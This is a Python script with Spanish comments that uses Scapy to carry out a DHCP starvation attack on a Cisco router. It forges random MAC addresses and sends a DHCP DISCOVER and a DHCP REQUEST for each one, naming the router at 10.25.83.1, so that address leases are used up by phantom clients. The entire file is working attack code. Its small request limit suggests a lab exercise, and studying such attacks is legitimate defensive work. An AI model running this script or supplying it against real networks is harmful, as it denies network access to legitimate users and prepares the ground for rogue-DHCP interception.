#!/usr/bin/env python3
import sys
import time
import random
from scapy.all import *

interface = "eth0"
limite_peticiones = 10  # Número de IPs que vas a agotar
pausa = 0.5            # Pausa para que el router procese

print(f"[*] Iniciando DHCP Starvation Completo para Cisco en {interface}...")

try:
    for i in range(1, limite_peticiones + 1):
        # 1. Crear identidad del cliente fantasma
        fake_mac = RandMAC()
        fake_mac_bytes = bytes.fromhex(fake_mac.replace(":", ""))
        fake_xid = random.randint(1, 900000000)
        
        print(f"\n[+] [{i}/{limite_peticiones}] Atacando con MAC: {fake_mac}")
        
        # 2. ENVIAR DISCOVER
        discover = (
            Ether(dst="ff:ff:ff:ff:ff:ff", src=fake_mac) /
            IP(src="0.0.0.0", dst="255.255.255.255") /
            UDP(sport=68, dport=67) /
            BOOTP(op=1, xid=fake_xid, chaddr=fake_mac_bytes + b"\x00" * 10) /
            DHCP(options=[("message-type", "discover"), "end"])
        )
        sendp(discover, iface=interface, verbose=False)
        
        # Esperar un instante corto a que el router genere la oferta
        time.sleep(0.1)
        
        # 3. ENVIAR REQUEST INMEDIATO (Simula que el cliente acepta la IP de la subred)
        # Forzamos al router a creer que el cliente ya tomó la IP para que la registre en su tabla
        request = (
            Ether(dst="ff:ff:ff:ff:ff:ff", src=fake_mac) /
            IP(src="0.0.0.0", dst="255.255.255.255") /
            UDP(sport=68, dport=67) /
            BOOTP(op=1, xid=fake_xid, chaddr=fake_mac_bytes + b"\x00" * 10) /
            DHCP(options=[
                ("message-type", "request"),
                ("server_id", "10.25.83.1"), # IP de tu router
                "end"
            ])
        )
        sendp(request, iface=interface, verbose=False)
        
        time.sleep(pausa)

    print("\n[+] Ráfaga completada. Revisa la tabla de asignaciones en el router.")

except KeyboardInterrupt:
    print("\n[-] Ataque detenido.")
    sys.exit(0)
